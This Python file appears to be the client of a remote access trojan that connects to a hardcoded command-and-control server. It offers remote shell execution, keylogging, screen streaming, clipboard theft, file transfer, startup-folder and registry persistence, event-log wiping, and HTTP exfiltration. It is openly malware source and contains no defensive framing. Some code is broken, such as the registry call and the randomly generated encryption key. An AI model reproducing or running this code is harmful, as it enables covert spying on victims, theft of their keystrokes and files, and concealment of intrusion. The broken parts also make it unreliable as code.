import socket
import os
import subprocess
import pyautogui
import time
import shutil
import ctypes
import platform
import getpass
import clipboard
import base64
from pynput import keyboard
import winreg as reg
from cryptography.fernet import Fernet
import requests

# Global variables
key_logs = []
key_logging = False
cipher = Fernet(Fernet.generate_key())  # Encryption for stealthy communication

def send_screenshare(client_socket):
    """Capture and send screen to the C2 server."""
    try:
        while True:
            screenshot = pyautogui.screenshot()
            screenshot_bytes = screenshot.tobytes()
            encrypted_screenshot = cipher.encrypt(screenshot_bytes)  # Encrypt screenshot
            client_socket.sendall(encrypted_screenshot)
            time.sleep(0.1)
    except Exception as e:
        print(f"[!] Error during screenshare: {e}")

def enable_persistence():
    """Enable persistence on the target system."""
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    script_path = os.path.abspath(__file__)
    if not os.path.exists(startup_path):
        os.makedirs(startup_path)
    shutil.copy(script_path, os.path.join(startup_path, os.path.basename(script_path)))
    return "Persistence enabled."

def add_to_registry():
    """Add to registry for persistence."""
    key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_WRITE)
    reg.SetValueEx(key, "UniqueIdentifier", 0, reg.REG_SZ, "C:\\Path\\To\\Your\\Executable.exe")
    reg.CloseKey(key)
    return "Added to registry for persistence."

def execute_command(command):
    """Execute a shell command."""
    result = subprocess.getoutput(command)
    return result

def wipe_event_logs():
    """Wipe event logs on the target system."""
    if os.name == 'nt':
        subprocess.call(["wevtutil", "clear-log", "Application"])
        subprocess.call(["wevtutil", "clear-log", "System"])
        return "Event logs cleared."
    else:
        return "Event log clearing only supported on Windows."

def reboot_system():
    """Reboot the target system."""
    if os.name == 'nt':
        subprocess.call(["shutdown", "/r", "/t", "0"])
    else:
        subprocess.call(["sudo", "reboot"])

def shutdown_system():
    """Shut down the target system."""
    if os.name == 'nt':
        subprocess.call(["shutdown", "/s", "/t", "0"])
    else:
        subprocess.call(["sudo", "shutdown", "now"])

def get_pc_info():
    """Retrieve system information."""
    info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "OS Release": platform.release(),
        "Architecture": platform.architecture(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Hostname": socket.gethostname()
    }
    return "\n".join(f"{key}: {value}" for key, value in info.items())

def get_user_info():
    """Retrieve current user and domain information."""
    user = getpass.getuser()
    domain = os.getenv("USERDOMAIN", "N/A")
    return f"User: {user}\nDomain: {domain}"

def get_clipboard_content():
    """Retrieve clipboard content."""
    try:
        content = clipboard.paste()
        return f"Clipboard Content: {content}"
    except Exception as e:
        return f"Error accessing clipboard: {e}"

def start_keylogger():
    """Start key logging."""
    global key_logging, key_logs
    key_logging = True
    key_logs = []

    def on_press(key):
        global key_logs, key_logging
        if not key_logging:
            return False  # Stop the listener
        try:
            if key == keyboard.Key.enter:
                key_logs.append("[ENTER]")
            elif hasattr(key, 'char') and key.char:  # Only capture printable characters
                key_logs.append(key.char)
        except AttributeError:
            pass

    # Start listener in a separate thread
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def stop_keylogger():
    """Stop key logging."""
    global key_logging
    key_logging = False

def dump_keylogs():
    """Dump logged keys."""
    global key_logs
    return "".join(key_logs)

# Communication functions (encrypted)
def encode_data(data):
    """Encrypt data before sending."""
    return cipher.encrypt(data.encode())

def decode_data(encrypted_data):
    """Decrypt data received."""
    return cipher.decrypt(encrypted_data).decode()

def send_data_via_http(data):
    """Send data via HTTP (using POST request)."""
    url = "https://example.com/receiver"
    payload = {'data': data}
    response = requests.post(url, data=payload)
    return response.text

# Main client loop
def client_loop(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))
    print(f"[*] Connected to C2 server at {server_ip}:{server_port}")

    while True:
        try:
            command = decode_data(client.recv(4096))  # Decrypt incoming command
            if command.lower() == "exit":
                print("[*] Exiting...")
                client.close()
                break
            elif command.lower() == "screenshare":
                send_screenshare(client)
            elif command.lower().startswith("upload"):
                _, file_path, *dest = command.split()
                if os.path.exists(file_path):
                    with open(file_path, 'rb') as f:
                        client.send(f.read())
            elif command.lower().startswith("download"):
                _, file_path = command.split()
                with open(file_path, 'wb') as f:
                    f.write(client.recv(4096))
            elif command.lower() == "persist":
                client.send(encode_data(enable_persistence()))
            elif command.lower() == "clearev":
                client.send(encode_data(wipe_event_logs()))
            elif command.lower() == "reboot":
                reboot_system()
            elif command.lower() == "shutdown":
                shutdown_system()
            elif command.lower() == "pcinfo":
                client.send(encode_data(get_pc_info()))
            elif command.lower() == "identify":
                client.send(encode_data(get_user_info()))
            elif command.lower() == "clipboard":
                client.send(encode_data(get_clipboard_content()))
            elif command.lower() == "keymon set on":
                start_keylogger()
                client.send(encode_data("Keylogger started."))
            elif command.lower() == "keymon set off":
                stop_keylogger()
                client.send(encode_data("Keylogger stopped."))
            elif command.lower() == "keymon dump":
                client.send(encode_data(dump_keylogs()))
            elif command.lower() == "help":
                help_text = """
Available Commands:
- upload <filename> -d <destination>: Upload a file to the client.
- download <filename>: Download a file from the client.
- persist: Enable persistence on the client system.
- clearev: Clear event logs on the client system.
- reboot: Reboot the client system.
- shutdown: Shut down the client system.
- screenshare: Start a live screen-sharing session.
- pcinfo: Get system information.
- identify: Get current user and domain.
- clipboard: View clipboard content.
- keymon set on: Start keylogger monitoring.
- keymon set off: Stop keylogger monitoring.
- keymon dump: Dump key logs.
"""
                client.send(encode_data(help_text))
            else:
                result = execute_command(command)
                client.send(encode_data(result))
        except Exception as e:
            print(f"[!] Error: {e}")
            client.close()
            break

if __name__ == "__main__":
    SERVER_IP = "10.0.1.37"  # Modify as necessary
    SERVER_PORT = 9999  # Modify as necessary
    client_loop(SERVER_IP, SERVER_PORT)
